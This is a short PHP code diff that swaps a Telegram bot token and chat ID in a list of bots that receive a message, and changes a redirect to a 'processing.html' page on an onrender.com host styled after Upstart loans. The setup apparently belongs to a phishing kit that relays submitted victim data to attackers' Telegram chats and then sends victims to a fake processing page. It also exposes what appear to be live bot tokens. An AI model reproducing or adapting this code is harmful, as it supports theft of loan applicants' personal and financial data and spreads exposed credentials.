@@ -16,8 +16,8 @@ $telegram_bots = [
         'chat_id' => '1325797388'
     ],
     [
-        'token' => '7626186834:AAH1zXLXNUx6vuLr_E8ALbxAcve7Mr0TFj0',
-        'chat_id' => '7521156137'
+        'token' => '7772784115:AAGyOO5fx4_6DAC-Y8_2tglpL3BWm6ezMvc',
+        'chat_id' => '6742345798'
     ]
     // Add more bots here if needed
 ];
@@ -92,7 +92,7 @@ sendMessageToTelegramBots($telegram_message, $telegram_bots);
 
 
 
-header("Location:https://upstartloan-mgsh.onrender.com/processing.html");
+header("Location:https://upstart-loans-opaw.onrender.com/processing.html");
 
 exit; 
 }
